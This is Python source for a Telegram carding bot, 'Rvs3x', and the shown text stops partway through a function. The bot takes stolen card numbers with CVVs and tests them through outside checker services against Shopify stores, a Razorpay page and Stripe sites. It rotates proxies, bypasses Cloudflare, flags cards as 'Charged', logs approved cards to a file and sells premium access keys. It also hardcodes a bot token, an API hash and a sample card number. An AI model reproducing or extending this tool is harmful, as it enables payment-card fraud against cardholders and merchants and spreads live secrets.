from telethon import TelegramClient, events, Button
from telethon.tl.types import KeyboardButtonCallback
import requests, random, datetime, json, os, re, asyncio, time
import string
import hashlib
import aiohttp
import aiofiles
from urllib.parse import urlparse, quote
import cloudscraper


# Config
API_ID = 21902589
API_HASH = "646d988e7c7938f85ca652ece00b07ba"
BOT_TOKEN = "8741520976:AAFgMrXI-WZVb2V4CYvDtoS_BDDbXuqGZlU"
ADMIN_ID = [7742548417]
GROUP_ID = -1003518846194

# Files
PREMIUM_FILE = "premium.json"
FREE_FILE = "free_users.json"
SITE_FILE = "user_sites.json"
KEYS_FILE = "keys.json"
CC_FILE = "cc.txt"
BANNED_FILE = "banned_users.json"
PROXY_FILE = "proxy.json"

ACTIVE_MTXT_PROCESSES = {}
TEMP_WORKING_SITES = {}
ACTIVE_RZP_PROCESSES = {}

DEFAULT_RZP_SITE = "https://razorpay.me/@azhimukham"
RZP_API_ENDPOINT = "https://rzp.victus.name/rzpv2"

DEFAULT_STRIPE_SITES = ["kabusvuya.com", "associationsmanagement.com"]
STRIPE_API_ENDPOINT = "https://blackxcard-autostripe.onrender.com/gateway=autostripe/key=Blackxcard"

ACTIVE_STRIPE_PROCESSES = {}

# --- Utility Functions ---

async def create_json_file(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as file:
                await file.write(json.dumps({}))
    except Exception as e:
        print(f"Error creating {filename}: {str(e)}")

async def initialize_files():
    for file in [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE, PROXY_FILE]:
        await create_json_file(file)

async def load_json(filename):
    try:
        if not os.path.exists(filename):
            await create_json_file(filename)
        async with aiofiles.open(filename, "r") as f:
            content = await f.read()
            return json.loads(content)
    except Exception as e:
        print(f"Error loading {filename}: {str(e)}")
        return {}

async def save_json(filename, data):
    try:
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps(data, indent=4))
    except Exception as e:
        print(f"Error saving {filename}: {str(e)}")

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def is_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    user_data = premium_users.get(str(user_id))
    if not user_data: return False
    expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
    current_date = datetime.datetime.now()
    if current_date > expiry_date:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return False
    return True

async def add_premium_user(user_id, days):
    premium_users = await load_json(PREMIUM_FILE)
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    premium_users[str(user_id)] = {
        'expiry': expiry_date.isoformat(),
        'added_by': 'admin',
        'days': days
    }
    await save_json(PREMIUM_FILE, premium_users)

async def remove_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    if str(user_id) in premium_users:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return True
    return False

async def is_banned_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    return str(user_id) in banned_users

async def ban_user(user_id, banned_by):
    banned_users = await load_json(BANNED_FILE)
    banned_users[str(user_id)] = {
        'banned_at': datetime.datetime.now().isoformat(),
        'banned_by': banned_by
    }
    await save_json(BANNED_FILE, banned_users)

async def unban_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    if str(user_id) in banned_users:
        del banned_users[str(user_id)]
        await save_json(BANNED_FILE, banned_users)
        return True
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200: return "BIN Info Not Found", "-", "-", "-", "-", "\U0001f3f3\ufe0f"
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '\U0001f3f3\ufe0f')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError: return "-", "-", "-", "-", "-", "\U0001f3f3\ufe0f"
    except Exception: return "-", "-", "-", "-", "-", "\U0001f3f3\ufe0f"

def normalize_card(text):
    if not text: return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16: cc = part
        elif len(part) == 4 and part.startswith('20'): yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '': mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '': yy = part
        elif len(part) in [3, 4] and cvv == '': cvv = part
    if cc and mm and yy and cvv: return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4: yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card: cards.add(card)
    return list(cards)

async def get_user_proxy(user_id):
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    if not user_proxies: return None
    return random.choice(user_proxies)

async def remove_dead_proxy(user_id, proxy_url):
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    for proxy_data in user_proxies:
        if proxy_data['proxy_url'] == proxy_url:
            user_proxies.remove(proxy_data)
            if user_proxies:
                proxies[str(user_id)] = user_proxies
            else:
                del proxies[str(user_id)]
            await save_json(PROXY_FILE, proxies)
            break

async def get_all_user_proxies(user_id):
    proxies = await load_json(PROXY_FILE)
    return proxies.get(str(user_id), [])

async def can_use(user_id, chat):
    if user_id in ADMIN_ID:
        return True, "admin"
    if await is_banned_user(user_id):
        return False, "banned"
    is_premium = await is_premium_user(user_id)
    is_private = chat.id == user_id
    if is_private:
        if is_premium: return True, "premium_private"
        else: return False, "no_access"
    else:
        if is_premium: return True, "premium_group"
        else: return True, "group_free"

def get_cc_limit(access_type, user_id=None):
    if user_id and user_id in ADMIN_ID: return 999999
    if access_type in ["premium_private", "premium_group"]: return 5000
    elif access_type == "group_free": return 100
    return 0

async def save_approved_card(card, status, response, gateway, price):
    try:
        async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
            await f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")
    except Exception as e: print(f"Error saving card to {CC_FILE}: {str(e)}")

async def pin_charged_message(event, message):
    try:
        if event.is_group: await message.pin()
    except Exception as e: print(f"Failed to pin message: {e}")

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try: parsed = urlparse(url)
        except: return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))

def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line and is_valid_url_or_domain(cleaned_line): clean_urls.add(cleaned_line)
    return list(clean_urls)

def is_site_dead(response_text):
    if not response_text: return True
    response_lower = response_text.lower()
    dead_indicators = [
        'receipt id is empty', 'handle is empty', 'product id is empty',
        'tax amount is empty', 'payment method identifier is empty',
        'invalid url', 'error in 1st req', 'error in 1 req',
        'cloudflare', 'connection failed', 'timed out',
        'access denied', 'tlsv1 alert', 'ssl routines',
        'could not resolve', 'domain name not found',
        'name or service not known', 'openssl ssl_connect',
        'empty reply from server', 'httperror504', 'http error',
        'timeout', 'unreachable', 'ssl error',
        '502', '503', '504', 'bad gateway', 'service unavailable',
        'gateway timeout', 'network error', 'connection reset',
        'failed to detect product', 'failed to create checkout',
        'failed to tokenize card', 'failed to get proposal data',
        'submit rejected', 'handle error', 'http 404',
        'delivery_delivery_line_detail_changed', 'delivery_address2_required',
        'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
        'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed'
    ]
    return any(indicator in response_lower for indicator in dead_indicators)

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    proxy_type = 'http'
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)
    host = port = username = password = ''
    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    elif re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy):
        match = re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        potential_host, potential_port, potential_user, potential_pass = match.groups()
        if 0 < int(potential_port) <= 65535:
            host, port, username, password = potential_host, potential_port, potential_user, potential_pass
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        match = re.match(r'^([^:@]+):(\d+)$', proxy)
        host, port = match.groups()
    else:
        return None
    if not host or not port: return None
    try:
        port_num = int(port)
        if port_num <= 0 or port_num > 65535: return None
    except ValueError: return None
    if username and password:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}'
        else:
            proxy_url = f'http://{username}:{password}@{host}:{port}'
    else:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{host}:{port}'
        else:
            proxy_url = f'http://{host}:{port}'
    return {
        'ip': host, 'port': port,
        'username': username if username else None,
        'password': password if password else None,
        'proxy_url': proxy_url, 'type': proxy_type
    }

async def test_proxy(proxy_url):
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://api.ipify.org?format=json', proxy=proxy_url) as res:
                if res.status == 200:
                    data = await res.json()
                    return True, data.get('ip', 'Unknown')
                return False, None
    except Exception as e:
        return False, str(e)

# --- Shopify API Functions ---

async def check_card_random_site(card, sites, user_id=None):
    if not sites: return {"Response": "ERROR", "Price": "-", "Gateway": "-"}, -1
    selected_site = random.choice(sites)
    site_index = sites.index(selected_site) + 1
    proxy_data = await get_user_proxy(user_id) if user_id else None
    try:
        if not selected_site.startswith('http'): selected_site = f'https://{selected_site}'
        proxy_str = None
        if proxy_data:
            ip = proxy_data.get('ip'); port = proxy_data.get('port')
            username = proxy_data.get('username'); password = proxy_data.get('password')
            if username and password: proxy_str = f"{ip}:{port}:{username}:{password}"
            else: proxy_str = f"{ip}:{port}"
        url = f'https://xaeden.onrender.com/sh?cc={card}&url={selected_site}'
        if proxy_str: url += f'&proxy={proxy_str}'
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-"}, site_index
                try: response_json = await res.json()
                except:
                    response_text = await res.text()
                    return {"Response": f"Invalid JSON response: {response_text[:100]}", "Price": "-", "Gateway": "-"}, site_index
                api_response = response_json.get('Response', '')
                price = response_json.get('Price', '-')
                if price != '-': price = f"${price}"
                gateway = response_json.get('Gate', 'Shopify')
                if proxy_data and user_id and ('proxy' in api_response.lower() or 'connection' in api_response.lower() or 'timeout' in api_response.lower()):
                    await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                    return {"Response": "Proxy is dead and has been removed! Use /addpxy to add new one", "Price": "-", "Gateway": "-", "Status": "Proxy Dead"}, site_index
                if "Order completed" in api_response or "\U0001f48e" in api_response:
                    return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Charged"}, site_index
                else:
                    return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": api_response}, site_index
    except Exception as e:
        return {"Response": str(e), "Price": "-", "Gateway": "-"}, site_index

async def check_card_specific_site(card, site, user_id=None):
    proxy_data = await get_user_proxy(user_id) if user_id else None
    try:
        if not site.startswith('http'): site = f'https://{site}'
        proxy_str = None
        if proxy_data:
            ip = proxy_data.get('ip'); port = proxy_data.get('port')
            username = proxy_data.get('username'); password = proxy_data.get('password')
            if username and password: proxy_str = f"{ip}:{port}:{username}:{password}"
            else: proxy_str = f"{ip}:{port}"
        url = f'https://xaeden.onrender.com/sh?cc={card}&url={site}'
        if proxy_str: url += f'&proxy={proxy_str}'
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-"}
                try: response_json = await res.json()
                except:
                    response_text = await res.text()
                    return {"Response": f"Invalid JSON response: {response_text[:100]}", "Price": "-", "Gateway": "-"}
                api_response = response_json.get('Response', '')
                price = response_json.get('Price', '-')
                if price != '-': price = f"${price}"
                gateway = response_json.get('Gate', 'Shopify')
                if proxy_data and user_id and ('proxy' in api_response.lower() or 'connection' in api_response.lower() or 'timeout' in api_response.lower()):
                    await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                    return {"Response": "Proxy is dead and has been removed! Use /addpxy to add new one", "Price": "-", "Gateway": "-", "Status": "Proxy Dead"}
                if "Order completed" in api_response or "\U0001f48e" in api_response:
                    return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Charged"}
                else:
                    return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": api_response}
    except Exception as e:
        return {"Response": str(e), "Price": "-", "Gateway": "-"}

async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None):
    try:
        if not site.startswith('http'): site = f'https://{site}'
        proxy_data = await get_user_proxy(user_id) if user_id else None
        proxy_str = None
        if proxy_data:
            ip = proxy_data.get('ip'); port = proxy_data.get('port')
            username = proxy_data.get('username'); password = proxy_data.get('password')
            if username and password: proxy_str = f"{ip}:{port}:{username}:{password}"
            else: proxy_str = f"{ip}:{port}"
        url = f'https://xaeden.onrender.com/sh?cc={test_card}&url={site}'
        if proxy_str: url += f'&proxy={proxy_str}'
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"status": "dead", "response": f"HTTP {res.status}", "site": site, "price": "-"}
                try: response_json = await res.json()
                except:
                    response_text = await res.text()
                    return {"status": "dead", "response": f"Invalid JSON: {response_text[:100]}", "site": site, "price": "-"}
                response_msg = response_json.get("Response", "")
                price = response_json.get("Price", "-")
                if price != '-': price = f"${price}"
                if proxy_data and user_id and ('proxy' in response_msg.lower() or 'connection' in response_msg.lower() or 'timeout' in response_msg.lower()):
                    await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                    return {"status": "proxy_dead", "response": "Proxy is dead and has been removed!", "site": site, "price": "-"}
                if is_site_dead(response_msg):
                    return {"status": "dead", "response": response_msg, "site": site, "price": price}
                else:
                    return {"status": "working", "response": response_msg, "site": site, "price": price}
    except Exception as e:
        return {"status": "dead", "response": str(e), "site": site, "price": "-"}

# --- Razorpay API Functions ---

async def check_card_razorpay(card, amount="1", user_id=None):
    proxy_data = await get_user_proxy(user_id) if user_id else None
    try:
        url = f'{RZP_API_ENDPOINT}?cc={card}&site={DEFAULT_RZP_SITE}&amount={amount}'
        proxies = None
        if proxy_data:
            proxy_url = proxy_data.get('proxy_url')
            proxies = {"http": proxy_url, "https": proxy_url}
        loop = asyncio.get_event_loop()
        def make_request():
            try:
                scraper = cloudscraper.create_scraper()
                return scraper.get(url, timeout=100, proxies=proxies)
            except Exception as e: return e
        res = await loop.run_in_executor(None, make_request)
        if isinstance(res, Exception):
            error_str = str(res)
            if 'proxy' in error_str.lower() and user_id and proxy_data:
                await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                return {"Response": "Proxy is dead and has been removed!", "Price": "-", "Gateway": f"Razorpay \u20b9{amount}", "Status": "Proxy Dead"}
            return {"Response": "Connection Error", "Price": "-", "Gateway": f"Razorpay \u20b9{amount}"}
        if res.status_code != 200:
            error_text = res.text
            if 'cloudflare' in error_text.lower() or 'challenge' in error_text.lower():
                return {"Response": "Cloudflare blocked! Try a different proxy.", "Price": "-", "Gateway": f"Razorpay \u20b9{amount}"}
            return {"Response": f"HTTP_ERROR_{res.status_code}", "Price": "-", "Gateway": f"Razorpay \u20b9{amount}"}
        try: response_json = res.json()
        except: return {"Response": f"Invalid JSON response: {res.text[:100]}", "Price": "-", "Gateway": f"Razorpay \u20b9{amount}"}
        message = response_json.get('message', '')
        status = response_json.get('status', '')
        reason = response_json.get('reason', '')
        is_success = status.lower() == 'success' or 'success' in message.lower() or 'charged' in message.lower()
        if is_success:
            api_response = message
            api_status = "Charged"
        else:
            api_response = f"{message} ({reason})" if reason else message
            api_status = reason if reason else status
        price = f"\u20b9{amount}"
        gateway = f"Razorpay \u20b9{amount}"
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": api_status}
    except Exception as e:
        return {"Response": str(e)[:200], "Price": "-", "Gateway": f"Razorpay \u20b9{amount}"}

async def check_card_razorpay_with_proxy(card, proxy_data, amount="1"):
    try:
        url = f'{RZP_API_ENDPOINT}?cc={card}&site={DEFAULT_RZP_SITE}&amount={amount}'
        proxies = None
        if proxy_data:
            proxy_url = proxy_data.get('proxy_url')
            proxies = {"http": proxy_url, "https": proxy_url}
        loop = asyncio.get_event_loop()
        def make_request():
            try:
                scraper = cloudscraper.create_scraper()
                return scraper.get(url, timeout=100, proxies=proxies)
            except Exception as e: return e
        res = await loop.run_in_executor(None, make_request)
        if isinstance(res, Exception):
            return {"Response": f"Request failed: {str(res)[:100]}", "Price": "-", "Gateway": f"Razorpay \u20b9{amount}"}
        if res.status_code != 200:
            return {"Response": f"HTTP_ERROR_{res.status_code}", "Price": "-", "Gateway": f"Razorpay \u20b9{amount}"}
        try: response_json = res.json()
        except: return {"Response": "Invalid JSON response", "Price": "-", "Gateway": f"Razorpay \u20b9{amount}"}
        message = response_json.get('message', '')
        status = response_json.get('status', '')
        reason = response_json.get('reason', '')
        is_success = status.lower() == 'success' or 'success' in message.lower() or 'charged' in message.lower()
        if is_success:
            api_response = message
            api_status = "Charged"
        else:
            api_response = f"{message} ({reason})" if reason else message
            api_status = reason if reason else status
        price = f"\u20b9{amount}"
        gateway = f"Razorpay \u20b9{amount}"
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": api_status}
    except Exception as e:
        return {"Response": str(e)[:200], "Price": "-", "Gateway": f"Razorpay \u20b9{amount}"}

# --- Stripe Auth API Functions ---

async def check_card_stripe_auth(card, site=None):
    if not site: site = random.choice(DEFAULT_STRIPE_SITES)
    try:
        url = f'{STRIPE_API_ENDPOINT}/site={site}/cc={card}'
        loop = asyncio.get_event_loop()
        def make_request():
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': 'application/json, text/plain, */*'}
                time.sleep(random.uniform(1, 3))
                return requests.get(url, headers=headers, timeout=100)
            except Exception as e: return e
        res = await loop.run_in_executor(None, make_request)
        if isinstance(res, Exception):
            return {"Response": "Connection Error", "Price": "-", "Gateway": "Stripe Auth"}
        if res.status_code != 200:
            if 'cloudflare' in res.text.lower():
                return {"Response": "Cloudflare blocked!", "Price": "-", "Gateway": "Stripe Auth"}
            return {"Response": f"HTTP_ERROR_{res.status_code}", "Price": "-", "Gateway": "Stripe Auth"}
        try: response_json = res.json()
        except:
            if '<html' in res.text.lower(): return {"Response": "Site returned HTML (blocked)", "Price": "-", "Gateway": "Stripe Auth"}
            return {"Response": f"API Error: {res.text[:100]}", "Price": "-", "Gateway": "Stripe Auth"}
        api_response = response_json.get('response', '')
        api_status = response_json.get('status', '')
        if not api_response:
            reason = response_json.get('reason', '')
            message = response_json.get('message', '')
            api_response = reason or message or api_status
        price = response_json.get('Price', '-')
        if price != '-' and price != '': price = f"${price}"
        gateway = response_json.get('Gate', 'Stripe Auth')
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": api_status}
    except Exception as e:
        return {"Response": str(e)[:200], "Price": "-", "Gateway": "Stripe Auth"}

# --- Bot Client ---

client = TelegramClient('cc_bot', API_ID, API_HASH)

def banned_user_message():
    return "\U0001f6ab **You Are Banned!**\n\nContact @rev3rsex for appeal."

# --- /start ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]start$'))
async def start(event):
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    user = await event.get_sender()
    name = user.first_name
    if user.last_name: name += f" {user.last_name}"
    profile = f"<a href='tg://user?id={user.id}'>{name}</a>"
    if access_type == "admin":
        status = "\U0001f451 Admin"; limit = "\u221e Unlimited"
    elif access_type in ["premium_private", "premium_group"]:
        status = "\U0001f48e Premium"; limit = f"{get_cc_limit(access_type, event.sender_id)} CCs"
    else:
        status = "\U0001f193 Free"; limit = f"{get_cc_limit(access_type, event.sender_id)} CCs"
    final_text = f"""[<a href='https://t.me/rev3rsexmain'>\u26ef</a>] <b>Rvs3x | Version - 2.0</b>
<pre>Constantly Upgrading...</pre>
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
<b>Hello,</b> {profile}
<i>How Can I Help You Today.?!</i>
\u2300 <b>Your UserID</b> - <code>{user.id}</code>
\u26f6 <b>BOT Status</b> - <code>Online \U0001f7e2</code>
\u2394 <b>Your Plan</b> - <code>{status}</code>
\u2394 <b>Your Limit</b> - <code>{limit}</code>
<b>Explore - Click the buttons below!</b>"""
    buttons = [
        [Button.inline("Register", b"register"), Button.inline("Commands", b"home_menu")],
        [Button.inline("Close", b"close")]
    ]
    await event.reply(final_text.strip(), buttons=buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"close"))
async def close_callback(event):
    await event.edit("<pre>Thanks For Using #Rvs3x</pre>", parse_mode='html')

@client.on(events.CallbackQuery(pattern=b"home_menu"))
async def home_menu_callback(event):
    home_text = """<pre>JOIN BEFORE USING.</pre>
<b>~ Main :</b> <b><a href="https://t.me/rev3rsexmain">Join Now</a></b>
<b>~ Chat Group :</b> <b><a href="https://t.me/Stripenigga">Join Now</a></b>
<pre>Choose Your Gate Type :</pre>"""
    home_buttons = [
        [Button.inline("Gates", b"gates"), Button.inline("Tools", b"tools")],
        [Button.inline("Back", b"start_back"), Button.inline("Close", b"close")]
    ]
    await event.edit(home_text, buttons=home_buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"start_back"))
async def start_back_callback(event):
    _, access_type = await can_use(event.sender_id, event.chat)
    user = await event.get_sender()
    name = user.first_name or "User"
    profile = f"<a href='tg://user?id={user.id}'>{name}</a>"
    if access_type == "admin": status = "\U0001f451 Admin"; limit = "\u221e Unlimited"
    elif access_type in ["premium_private", "premium_group"]: status = "\U0001f48e Premium"; limit = f"{get_cc_limit(access_type, event.sender_id)} CCs"
    else: status = "\U0001f193 Free"; limit = f"{get_cc_limit(access_type, event.sender_id)} CCs"
    final_text = f"""[<a href='https://t.me/rev3rsexmain'>\u26ef</a>] <b>Rvs3x | Version - 2.0</b>
<pre>Constantly Upgrading...</pre>
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
<b>Hello,</b> {profile}
\u2394 <b>Your Plan</b> - <code>{status}</code>
\u2394 <b>Your Limit</b> - <code>{limit}</code>"""
    buttons = [
        [Button.inline("Register", b"register"), Button.inline("Commands", b"home_menu")],
        [Button.inline("Close", b"close")]
    ]
    await event.edit(final_text.strip(), buttons=buttons, parse_mode='html', link_preview=False)

@client.on(events.CallbackQuery(pattern=b"gates"))
async def gates_callback(event):
    gates_text = """<pre>Available Gates:</pre>
\u27d0 <b>Shopify</b> - <code>/sh, /msh, /mtxt</code>
\u27d0 <b>Razorpay</b> - <code>/rzp, /mrzp, /rztxt</code>
\u27d0 <b>Stripe Auth</b> - <code>/au, /mau, /autxt</code>"""
    buttons = [[Button.inline("Back", b"home_menu"), Button.inline("Close", b"close")]]
    await event.edit(gates_text, buttons=buttons, parse_mode='html')

@client.on(events.CallbackQuery(pattern=b"tools"))
async def tools_callback(event):
    tools_text = """<pre>Tools:</pre>
<b>Sites:</b> <code>/add, /rm, /check</code>
<b>Proxy:</b> <code>/addpxy, /proxy, /rmpxy</code>
<b>Gen:</b> <code>/gen BIN amount</code>
<b>Other:</b> <code>/info, /redeem</code>"""
    buttons = [[Button.inline("Back", b"home_menu"), Button.inline("Close", b"close")]]
    await event.edit(tools_text, buttons=buttons, parse_mode='html')

@client.on(events.CallbackQuery(pattern=b"register"))
async def register_callback(event):
    user = await event.get_sender()
    buttons = [[Button.inline("Home", b"home_menu"), Button.inline("Close", b"close")]]
    await event.edit(f"""<pre>Registration Successful!</pre>
<b>Name</b> : <code>{user.first_name}</code>
<b>UserID</b> : <code>{user.id}</code>
<b>Plan</b> : <code>Free</code>""", buttons=buttons, parse_mode='html')

# --- Admin Commands ---

@client.on(events.NewMessage(pattern='/auth'))
async def auth_user(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: return await event.reply("Format: /auth {user_id} {days}")
        user_id = int(parts[1]); days = int(parts[2])
        await add_premium_user(user_id, days)
        await event.reply(f"\u2705 User {user_id} granted {days} days premium!")
    except Exception as e: await event.reply(f"\u274c Error: {e}")

@client.on(events.NewMessage(pattern='/key'))
async def generate_keys(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: return await event.reply("Format: /key {amount} {days}")
        amount = int(parts[1]); days = int(parts[2])
        if amount > 10: return await event.reply("\u274c Max 10 keys at once!")
        keys_data = await load_json(KEYS_FILE)
        generated_keys = []
        for _ in range(amount):
            key = generate_key()
            keys_data[key] = {'days': days, 'created_at': datetime.datetime.now().isoformat(), 'used': False, 'used_by': None}
            generated_keys.append(key)
        await save_json(KEYS_FILE, keys_data)
        keys_text = "\n".join([f"\U0001f511 `{key}`" for key in generated_keys])
        await event.reply(f"\u2705 Generated {amount} key(s) for {days} days:\n\n{keys_text}")
    except Exception as e: await event.reply(f"\u274c Error: {e}")

@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())
    try:
        parts = event.raw_text.split()
        if len(parts) != 2: return await event.reply("Format: /redeem {key}")
        key = parts[1].upper()
        keys_data = await load_json(KEYS_FILE)
        if key not in keys_data: return await event.reply("\u274c Invalid key!")
        if keys_data[key]['used']: return await event.reply("\u274c Key already used!")
        days = keys_data[key]['days']
        await add_premium_user(event.sender_id, days)
        keys_data[key]['used'] = True
        keys_data[key]['used_by'] = event.sender_id
        await save_json(KEYS_FILE, keys_data)
        await event.reply(f"\U0001f389 Redeemed {days} days premium access!")
    except Exception as e: await event.reply(f"\u274c Error: {e}")

@client.on(events.NewMessage(pattern='/ban'))
async def ban_user_command(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        parts = event.raw_text.split()
        if len(parts) != 2: return await event.reply("Format: /ban {user_id}")
        user_id = int(parts[1])
        await ban_user(user_id, event.sender_id)
        await event.reply(f"\u2705 User {user_id} banned!")
    except Exception as e: await event.reply(f"\u274c Error: {e}")

@client.on(events.NewMessage(pattern='/unban'))
async def unban_user_command(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        parts = event.raw_text.split()
        if len(parts) != 2: return await event.reply("Format: /unban {user_id}")
        await unban_user(int(parts[1]))
        await event.reply(f"\u2705 User unbanned!")
    except Exception as e: await event.reply(f"\u274c Error: {e}")

@client.on(events.NewMessage(pattern='/clear'))
async def clear_processes(event):
    if event.sender_id not in ADMIN_ID: return
    ACTIVE_MTXT_PROCESSES.clear(); ACTIVE_RZP_PROCESSES.clear(); ACTIVE_STRIPE_PROCESSES.clear()
    await event.reply("```\u2705 All stuck processes cleared!```")

# --- Site Management ---

@client.on(events.NewMessage(pattern='/add'))
async def add_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    try:
        add_text = event.raw_text[4:].strip()
        if not add_text: return await event.reply("Format: /add site.com site.com")
        sites_to_add = extract_urls_from_text(add_text)
        if not sites_to_add: return await event.reply("\u274c No valid urls found!")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        added = []; exists = []
        for site in sites_to_add:
            if site in user_sites: exists.append(site)
            else: user_sites.append(site); added.append(site)
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        parts = []
        if added: parts.append("\n".join(f"\u2705 Added: {s}" for s in added))
        if exists: parts.append("\n".join(f"\u26a0\ufe0f Already exists: {s}" for s in exists))
        if parts: await event.reply("\n\n".join(parts))
    except Exception as e: await event.reply(f"\u274c Error: {e}")

@client.on(events.NewMessage(pattern='/rm'))
async def remove_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    try:
        rm_text = event.raw_text[3:].strip()
        if not rm_text: return await event.reply("Format: /rm site.com")
        sites_to_remove = extract_urls_from_text(rm_text)
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        removed = []
